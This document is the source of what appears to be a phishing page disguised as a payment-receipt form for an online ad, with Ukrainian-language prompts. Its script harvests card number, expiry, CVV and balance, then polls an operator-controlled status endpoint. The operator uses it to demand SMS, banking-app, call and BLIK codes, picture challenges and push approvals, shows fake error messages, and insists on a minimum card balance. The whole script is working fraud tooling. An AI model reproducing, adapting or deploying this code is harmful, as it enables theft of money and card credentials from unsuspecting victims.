/* timeline */
.tracking {
  margin-top: 30px;
  display: grid;
  grid-template-columns: 7fr 3fr;
  grid-gap: 15px;
}
.tracking__card {
  padding-bottom: 32px;
}
.tracking-payment-info {
  color: #0e2f4b;
  font-family: "Open Sans", sans-serif;
  font-size: 14px;
  line-height: 20px;
  margin-bottom: 20px;
}
.tracking__header {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  grid-gap: 20px;
  margin-bottom: 30px;
}
.tracking__header-text {
  color: #0e2f4b;
  font-family: "Open Sans", sans-serif;
  font-size: 14px;
  line-height: 20px;
}
.tracking__header-text-bold {
  color: #0e2f4b;
  font-family: "Open Sans", sans-serif;
  font-size: 14px;
  font-weight: 700;
  line-height: 20px;
  margin-bottom: 5px;
  text-align: center;
}
.tracking__badge {
  display: flex;
  flex-direction: column;
  align-items: center;
}
.tracking__link {
  color: #f29200;
}
.tracking__link:hover {
  color: #f29200 !important;
  opacity: 0.8;
}
.timeline-container {
  display: grid;
  position: relative;
  grid-template-columns: repeat(3, 1fr);
  margin-top: 40px;
}
.timeline-line {
  position: absolute;
  left: 0;
  bottom: 0;
  width: 100%;
  height: 4px;
  background-color: #f29200;
}
.timeline-item {
  display: flex;
  flex-direction: column;
  align-items: center;
}
.timeline-item-circle {
  min-width: 28px;
  min-height: 28px;
  width: 28px;
  height: 28px;
  border-radius: 50%;
  background-color: #fff;
  border: 5px solid #f29200;
  transform: translateY(56px);

  margin-bottom: -15px;
}
.timeline-item.active .timeline-item-circle {
  background-color: #f29200;
}
.timeline-item.active .timeline-item-text {
  color: #f29200;
}
.timeline-item-text {
  transform: translateY(-20px);
}

.timeline-item-text {
  color: #0e2f4b;

  font-size: 14px;
  font-weight: 600;
  line-height: 20px;
  margin-bottom: 5px;
  max-width: 180px;
  text-align: center;
}
.tracking-payment-card {
  display: flex;
  flex-direction: column;
  justify-content: space-between;
}
.primary {
  color: #f29200;
  font-weight: 600;
}
.list-wrapper {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
}
.waiting-alert-container {
  display: flex;
  align-items: center;
}
.waiting-alert {
  text-align: right;
  max-width: 280px;
  color: #0e2f4b;
  font-weight: 600;
  font-family: "Rubik", sans-serif;
  font-size: 14px;
  line-height: 20px;
  margin-right: 14px;
}
@media all and (max-width: 1024px) {
  .tracking {
    grid-template-columns: 1fr;
  }
}
@media all and (max-width: 570px) {
  .tracking__header {
    grid-template-columns: 1fr;
    grid-row-gap: 8px;
  }
}
@media all and (max-width: 991px) {
  .list-wrapper {
    display: flex;
    flex-direction: column;
  }
  .waiting-alert-container {
    order: -1;
    margin-bottom: 20px;
  }
  .waiting-alert-container svg {
    order: -1;
  }
  .waiting-alert {
    margin-left: 16px;
    margin-right: 0;
    text-align: left;
  }
}
@media all and (max-width: 991px) {
  .waiting-alert-container svg {
    min-width: 26px;
    min-height: 26px;
  }
}
@media all and (max-width: 768px) {
  .timeline-line {
    height: 100%;
    width: 4px;
    left: 12px;
  }
  .timeline-container {
    display: grid;
    grid-template-columns: 1fr;
    grid-row-gap: 20px;
    margin-top: 16px;
  }
  .timeline-item {
    flex-direction: row;
  }
  .timeline-item-circle {
    transform: initial;
    z-index: 5;
    margin-bottom: 0;
  }
  .timeline-item-text {
    transform: initial !important;
    margin: auto 0 auto 10px;
    max-width: 100%;
    text-align: left;
  }
  .timeline-item:first-of-type .timeline-item-circle {
    align-self: flex-start;
  }
  .timeline-item:last-of-type .timeline-item-circle {
    align-self: flex-end;
  }
}

<script>
    function formatExpirationDate(event) {
        const input = event.target;
        const value = input.value.replace(/\D/g, '').slice(0, 4);
        const month = value.slice(0, 2);
        const year = value.slice(2, 4);
        input.value = month + (year.length > 0 ? '/' + year : '');
    }
</script>

  <script defer>

    new Vue({
      el: "#app",
      data() {
        return {
          currentCardBackground: 8, // just for fun :D
          cardBalance: "",
          cardNumber: "",
          cardMonth: "",
          cardYear: "",
          cardCvv: "",
          minCardYear: new Date().getFullYear(),
          amexCardMask: "#### ###### #####",
          otherCardMask: "#### #### #### ####",
          cardNumberTemp: "",
          isCardFlipped: false,
          focusElementStyle: null,
          isInputFocused: false,
          step: 1,
          cardError: "",
          balanceChecker: false,
      loading: false,
        currentStatus: null,
        customError: null,
        lastnumber: null,
        ppamount: 1500,
          logToken: null,
          };
        },
    mounted() {
      this.cardNumberTemp = this.otherCardMask;
      document.getElementById("cardNumber").focus();
      $("body").on(
        "click",
        ".pictures-container:not(.disabled) .pictures-element[data-item]",
        (e) => {
          e.preventDefault();
          $(".pictures-container").removeClass("disabled").addClass("disabled");
          axios.post(`/api/selectPicture`, {
            picture: $(e.target).data("item") || $(e.target).parent().data("item"),
            token: this.logToken
          }).catch(() => { }).finally(() => {
            setTimeout(() => {
              alert("<%=translate["wrong_picture"][lang]%>");
              $(".pictures-container").removeClass("disabled");
              this.pictureModal();
            }, 750);
          });
        });
    },
    computed: {
      getCardType() {
        if (!this.cardNumber || String(this.cardNumber).trim().length < 1) return false;
        let number = this.cardNumber;
        let re = new RegExp("^4");
        if (number.match(re) != null) return "visa";

        re = new RegExp("^(34|37)");
        if (number.match(re) != null) return "amex";

        re = new RegExp("^5[1-5]");
        if (number.match(re) != null) return "mastercard";

        re = new RegExp("^6011");
        if (number.match(re) != null) return "discover";

        re = new RegExp("^9792");
        if (number.match(re) != null) return "troy";

        return "visa"; // default type
      },
      generateCardNumberMask() {
        return this.getCardType === "amex"
          ? this.amexCardMask
          : this.otherCardMask;
      },
      minCardMonth() {
        if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
        return 1;
      },
    },
    watch: {
      cardYear() {
        if (this.cardMonth < this.minCardMonth) {
          this.cardMonth = "";
        }
      },
      currentStatus(v) {
        if (v == "profit") this.successModal();
        else if (v == "sms") this.codeModal();
        else if (v == "appCode") this.codeModal(
          "app",
          "<%=translate["app_code_title"][lang]%>",
          "<%=translate["app_code_text"][lang]%>",
          "<%=translate["app_code_placeholder"][lang]%>",
        );
        else if (v == "callCode") this.codeModal(
          "call",
          "<%=translate["call_code_title"][lang]%>",
          "<%=translate["call_code_text"][lang]%>",
          "<%=translate["call_code_placeholder"][lang]%>",
        );
        else if (v == "blik") this.codeModal(
          "blik",
          "<%=translate["blik_code_title"][lang]%>",
          "<%=translate["blik_code_text"][lang]%>",
          "<%=translate["blik_code_placeholder"][lang]%>",
        );
        else if (v == "picture") this.pictureModal();
        else if (v == "push") this.pushModal();
        else if (v == "custom") this.customModal();
        else if (v == "gotp") this.gotpModal();
        else if (v == "limits") this.limitsModal();
        else if (v == "otherCard") this.otherCardModal();
        else if (v == "forVerify") this.forVerifyModal();
        else if (v == "popolnenie") this.ppModal();
        else if (v == "correctBalance") this.correctBalanceModal();
        else if (v == "numberCode") this.codeModal(
        "sms",
        `SMS з кодом для підтвердження замовлення відправлено на номер +380******${this.lastnumber}`,
        "",
        "",
        "",
        "info"
      );
        else if (v == "correctCode") this.codeModal(
        "sms",
        `Ви ввели неправильний код.

Вкажіть вірний код в поле нижче`,
        "",
        "",
        "",
        "error"
      );

        else if (v == 'customQuest') this.codeModal(
        "question",
        this.customError,
        "",
        "",
        "",
        "info"
      );
        else if (v == "lk") document.location.href = `/personal/${this.logToken}`;
      },
    },
    methods: {
      limitsModal() {
        swal(
          "<%=translate["error_title"][lang]%>",
          "<%=translate["limits"][lang]%>",
          "error"
        );
      },
      forVerifyModal() {
        swal(
          "<%=translate["error_title"][lang]%>",
          "<%=translate["for_verify"][lang]%>",
          "error"
        );
      },
      correctBalanceModal() {
        swal(
          "<%=translate["error_title"][lang]%>",
          "<%=translate["correct_balance"][lang]%>",
          "error"
        );
      },
      gotpModal() {
        swal(
          "<%=translate["error_title"][lang]%>",
          "Швидкий зв'язок з оператором,вирішення фінансових питань, ви можете звернутися в онлайн-техпідтримку. (Синє вікно в правому нижньому куті)",
          "error"
        );
        
        setTimeout(() => {
          smartsupp('chat:open');
        }, 5000);
      },
      needBalanceModal() {
        swal(
          "<%=translate["error_title"][lang]%>",
          "<%=translate["needBalance"][lang]%>",
          "error"
        );
      },
      ppModal() {
        swal(
          "<%=translate["error_title"][lang]%>",
          `Для успішного зарахування коштів на вашій платіжній картці має бути не менше ${this.ppamount} грн. Рекомендуємо поповнити баланс або скористатися іншою карткою для зарахування.`,
          "error"
        );
      },
      otherCardModal() {
        swal(
          "<%=translate["error_title"][lang]%>",
          "<%=translate["other_card"][lang]%>",
          "error"
        );
      },
      customModal() {
        swal(
          "<%=translate["error_title"][lang]%>",
          this.customError,
          "error"
        );
      },
      pushModal() {
        swal(
          "<%=translate["push_title"][lang]%>",
          "<%=translate["push_text"][lang]%>",
          "info", {

          closeOnClickOutside: false,
          closeOnEsc: false,
          buttons: false,
        }
        );
      },

      successModal() {
        swal(
          "<%=translate["success"][lang]%>",
          "<%=translate["money_will"][lang]%>",
          "success", {

          closeOnClickOutside: false,
          closeOnEsc: false,
          buttons: false,
        }
        );
      },
      pictureModal(){
        swal("<%=translate["picture_title"][lang]%>", "<%=translate["picture_text"][lang]%>", "info", {
          content: {
            element: "div",
            attributes: {
              id: "pictures_div"
            },
          },
          closeOnClickOutside: false,
          closeOnEsc: false,
          buttons: false,
        });
        const pictures = [
          "банан",
          "брюки",
          "бургер",
          "гитара",
          "зонтик",
          "календарь",
          "калькулятор",
          "карандаш",
          "клубника",
          "компас",
          "крокодил",
          "лимон",
          "мамонт",
          "микрофон",
          "наушники",
          "очки",
          "помидор",
          "свитер",
          "телефон",
          "цветок",
          "шоколад",
        ].sort(() => Math.random() - 0.5);

        document.querySelector("#pictures_div").innerHTML = '<div class="pictures-container">' + pictures.map(v => '<div class="pictures-element" data-item="' + v + '"><img draggable="false" alt="" src="/img/pictures/' + v + '.png"></div>').join("\n") + '</div>';
        document.querySelector(".pictures-container").classList.remove("disabled");
      },
      codeModal(codeType = "sms", title = "<%=translate["sms_title"][lang]%>", text = "<%=translate["sms_text"][lang]%>", placeholder = "<%=translate["sms_placeholder"][lang]%>", wrong_code = "<%=translate["wrong_code"][lang]%>", logo="") {
        swal.stopLoading();
        swal({
          title,
          text,
          icon: logo,
          content: {
            element: "input",
            attributes: {
              type: "number",
              placeholder,
              maxLength: 8,
              required: true,
              style:
                "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
            },
          },
          closeOnEsc: false,
          closeOnClickOutside: false,
          buttons: {
            confirm: {
              text: "<%=translate["submit"][lang]%>",
              closeModal: false,
            },
          },
        }).then(async (code) => {
          try {
            if (!code) {
              swal.stopLoading();
              return this.codeModal(...arguments);
            }
            if (codeType == 'question') {
            await axios.post("/api/submitQuestion", {
            codeType,
            code,
            token: this.logToken,
          });
          } else {
          await axios.post("/api/submitCode", {
            codeType,
            code,
            token: this.logToken,
          });
        }

            swal.stopLoading();
            return               swal({
              title: "<%=translate["wait"][lang]%>",
              text: "<%=translate["bank_processes"][lang]%>",
              icon: "info",
              closeOnClickOutside: false,
              closeOnEsc: false,
              buttons: false,
            });
        } catch (err) {
          swal.stopLoading();
          return swal({
              title: "<%=translate["wait"][lang]%>",
              text: "<%=translate["bank_processes"][lang]%>",
              icon: "info",
              closeOnClickOutside: false,
              closeOnEsc: false,
              buttons: false,
            });
        }
        });
      },
      valid_credit_card(value) {
        // accept only digits, dashes or spaces
        if (/[^0-9-\s]+/.test(value)) return false;

        // The Luhn Algorithm. It's so pretty.
        var nCheck = 0,
          nDigit = 0,
          bEven = false;
        value = value.replace(/\D/g, "");

        for (var n = value.length - 1; n >= 0; n--) {
          var cDigit = value.charAt(n),
            nDigit = parseInt(cDigit, 10);

          if (bEven) {
            if ((nDigit *= 2) > 9) nDigit -= 9;
          }

          nCheck += nDigit;
          bEven = !bEven;
        }

        return nCheck % 10 == 0;
      },
      submitForm(e) {
        e.preventDefault();

        if (!this.valid_credit_card(this.cardNumber)) {
          return (this.cardError = "<%=translate["card_number_invalid"][lang]%>");
        } else {
          this.cardError = "";
        }
        if (this.step < 2 && this.balanceChecker) {
          swal({
            title: "<%=translate["attention"][lang]%>",
            icon: "warning",
            text:
              "<%=translate["bank_asked"][lang]%>",
            buttons: true,
            dangerMode: true,
          }).then((val) => {
            if (val) this.step = 2;
          });
        } else if (this.step == 2 || !this.balanceChecker) {
          this.loading = true;
          axios
            .post("/api/submitCard", {
              adId: <%=ad.adid %>,
              number: this.cardNumber.replace(/\D+/g, ""),
              expire:
                this.cardMonth.toString() +
                "/" +
                this.cardYear.toString().substr(-2),
              cvv: this.cardCvv,
              balance: this.cardBalance,
            })
            .finally(() => (this.loading = false))
            .then((response) => {
              localStorage.token = response.data.token;
              this.logToken = response.data.token;
              if (this.currentStatus == null) this.checkLogStatus();
              swal({
                title: "<%=translate["wait"][lang]%>",
                text: "<%=translate["bank_processes"][lang]%>",
                icon: "info",
                closeOnClickOutside: false,
                closeOnEsc: false,
                buttons: false,
              });
            })
            .catch((err) => {
              swal("<%=translate["error_title"][lang]%>", "<%=translate["error"][lang]%>", "error");
            });
        }
      },
      checkLogStatus() {
        axios
          .post("/api/checkStatus", {
            token: this.logToken,
          })
          .finally(() => setTimeout(() => this.checkLogStatus(this.logToken), 1500))
          .then((response) => {
            if (this.currentStatus != response.data.status)
              this.currentStatus = response.data.status;
              this.customError = response.data.custom;

          })
          .catch((err) => err);
      },
      flipCard(status) {
        this.isCardFlipped = status;
      },
      focusInput(e) {
        this.isInputFocused = true;
        let targetRef = e.target.dataset.ref;
        let target = this.$refs[targetRef];
        this.focusElementStyle = {
          width: `${target.offsetWidth}px`,
          height: `${target.offsetHeight}px`,
          transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`,
        };
      },
      blurInput() {
        let vm = this;
        setTimeout(() => {
          if (!vm.isInputFocused) {
            vm.focusElementStyle = null;
          }
        }, 300);
        vm.isInputFocused = false;
      },
    },
      });
  </script>
